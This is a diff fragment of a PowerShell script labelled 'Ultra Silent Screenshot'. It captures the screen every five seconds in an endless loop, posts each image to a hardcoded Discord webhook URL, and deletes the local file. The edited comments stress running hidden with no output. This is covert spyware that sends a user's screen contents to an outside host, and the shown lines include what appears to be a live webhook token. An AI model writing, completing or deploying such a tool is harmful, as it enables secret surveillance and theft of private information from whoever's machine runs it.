@@ -1,5 +1,7 @@
-# Silent Screenshot Sender - Every 5 Seconds
-# Fully hidden mode
+# ===============================================
+# ULTRA SILENT SCREENSHOT - EVERY 5 SECONDS
+# NO OUTPUT WHATSOEVER
+# ===============================================
 
 $webhookUrl = "https://discord.com/api/webhooks/1507397879671685150/oRYUF8gCcyWpGAaRLBMA1pdAAvjRPq0iCfA7eXbnqI6-PZTVICQsAn-wbTbwjKMHyWoa"
 
@@ -28,7 +30,7 @@ function Send-ToDiscord {
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
 
-# Main Loop - Every 5 seconds
+# Main Loop - 5 seconds
 while ($true) {
     $path = Take-Screenshot
     Send-ToDiscord -filePath $path
